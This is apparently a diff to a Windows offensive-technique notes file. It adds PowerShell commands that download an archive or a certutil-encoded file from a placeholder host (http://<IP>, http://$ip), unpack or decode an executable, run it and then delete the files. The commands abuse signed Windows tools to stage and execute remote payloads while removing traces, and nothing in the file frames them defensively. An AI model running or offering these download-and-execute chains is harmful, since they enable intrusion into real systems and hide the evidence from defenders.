@@ -3,3 +3,27 @@ certutil -encode test.exe test.txt
 
 # Execute the binary using Microsoft Signed binaries
 Start-Process -FilePath curl -ArgumentList "http://<IP>/test.txt -o $($pwd.Path)\test.txt" -Wait; certutil -decode "$($pwd.Path)\test.txt" "$($pwd.Path)\test.exe"; Start-Process -FilePath "$($pwd.Path)\test.exe" -Wait; Remove-Item -Path "$($pwd.Path)\test.exe"; Remove-Item -Path "$($pwd.Path)\test.txt"
+
+
+curl http://$ip/test.tar.gz -o test.tar.gz
+$tarGzFile = "C:\Users\user\Desktop\test.tar.gz"
+$destinationFolder = "C:\Users\user\Desktop\test_extraction"
+if (-not (Test-Path -Path $destinationFolder)) {
+>>     New-Item -ItemType Directory -Path $destinationFolder | Out-Null
+>> }
+
+tar -xzf $tarGzFile -C $destinationFolder
+Set-Location -Path $destinationFolder
+$binaryFile = Get-ChildItem -Path $destinationFolder -File | Where-Object { $_.Extension -eq ".exe" } | Select-Object -First 1
+
+
+if ($binaryFile) {
+>>     & $binaryFile.FullName
+>>     Remove-Item -Path $binaryFile.FullName -Force
+>>     cd ..
+>>     Remove-Item -Path $destinationFolder -Recurse -Force
+>> }
+
+
+del .\test.tar.gz
+
